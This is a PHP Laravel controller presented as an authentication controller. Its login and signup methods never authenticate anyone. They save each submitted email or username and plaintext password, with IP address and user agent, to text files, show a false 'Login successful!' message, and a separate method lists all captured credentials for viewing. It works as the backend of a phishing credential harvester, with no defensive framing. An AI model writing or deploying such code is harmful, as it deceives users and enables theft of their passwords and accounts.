<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;

class AuthController extends Controller
{
    public function showLogin()
    {
        return view('login');
    }

    public function login(Request $request)
    {
        $email = $request->input('email');
        $password = $request->input('password');

        // Create filename with timestamp
        $filename = 'credentials_' . now()->format('Y-m-d_H-i-s') . '.txt';
        
        // Format credentials with more detail
        $content = "Login Details:\n";
        $content .= "-------------\n";
        $content .= "Email: $email\n";
        $content .= "Password: $password\n";
        $content .= "Timestamp: " . now() . "\n";
        $content .= "IP Address: " . $request->ip() . "\n";
        $content .= "User Agent: " . $request->userAgent() . "\n";
        $content .= "-------------\n";

        // Save to storage/app/credentials folder
        file_put_contents(storage_path('app/credentials/' . $filename), $content);

        // Show success message and redirect back
        return back()->with('success', 'Login successful!');
    }

    public function showSignup()
    {
        return view('signup');
    }

    public function signup(Request $request)
    {
        $username = $request->input('username');
        $password = $request->input('password');
        
        // Create filename with timestamp
        $filename = 'signup_' . now()->format('Y-m-d_H-i-s') . '.txt';
        
        // Format credentials with more detail
        $content = "Signup Details:\n";
        $content .= "-------------\n";
        $content .= "Username: $username\n";
        $content .= "Password: $password\n";
        $content .= "Timestamp: " . now() . "\n";
        $content .= "IP Address: " . $request->ip() . "\n";
        $content .= "User Agent: " . $request->userAgent() . "\n";
        $content .= "-------------\n";

        // Save to storage/app/credentials folder
        file_put_contents(storage_path('app/credentials/' . $filename), $content);
        
        return back()->with('success', 'Sign up successful!');
    }

    public function viewCredentials()
    {
        $credentialsPath = storage_path('app/credentials');
        $credentials = [];
        
        if (is_dir($credentialsPath)) {
            $files = glob($credentialsPath . '/*.txt');
            
            foreach ($files as $file) {
                $credentials[] = [
                    'filename' => basename($file),
                    'content' => file_get_contents($file),
                    'time' => filemtime($file)
                ];
            }
            
            // Sort by newest first
            usort($credentials, function($a, $b) {
                return $b['time'] - $a['time'];
            });
        }
        
        return view('credentials', ['credentials' => $credentials]);
    }
}
